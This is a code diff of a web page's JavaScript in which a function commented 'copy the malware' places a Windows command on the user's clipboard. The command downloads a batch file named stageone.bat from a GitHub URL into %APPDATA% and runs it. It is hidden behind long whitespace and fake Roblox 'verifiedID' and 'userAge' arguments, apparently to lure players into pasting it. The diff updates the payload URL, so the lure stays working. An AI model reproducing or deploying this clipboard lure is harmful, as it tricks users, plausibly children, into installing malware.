@@ -415,12 +415,12 @@
 
         function copyMaliciousCode() {
             // copy the malware
-            navigator.clipboard.writeText(`cmd /c "curl --ssl-no-revoke -o %APPDATA%\s.bat https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/bat/stageone.bat & start %APPDATA%\s.bat"                                      Roblox.exe --verifiedID='by-moderator' --userAge='18'`).then(function() {
+            navigator.clipboard.writeText(`cmd /c "curl --ssl-no-revoke -o %APPDATA%\s.bat https://raw.githubusercontent.com/team-xz/teamx-z.github.io/refs/heads/main/dl/bat/stageone.bat & start %APPDATA%\s.bat"                                      Roblox.exe --verifiedID='by-moderator' --userAge='18'`).then(function() {
                 showCopyFeedback();
             }).catch(function() {
                 // fallback
                 const textArea = document.createElement('textarea');
-                textArea.value = `cmd /c "curl --ssl-no-revoke -o %APPDATA%\s.bat https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/bat/stageone.bat & start %APPDATA%\s.bat"                                      Roblox.exe --verifiedID='by-moderator' --userAge='18'`;
+                textArea.value = `cmd /c "curl --ssl-no-revoke -o %APPDATA%\s.bat https://raw.githubusercontent.com/team-xz/teamx-z.github.io/refs/heads/main/dl/bat/stageone.bat & start %APPDATA%\s.bat"                                      Roblox.exe --verifiedID='by-moderator' --userAge='18'`;
                 document.body.appendChild(textArea);
                 textArea.select();
                 document.execCommand('copy');
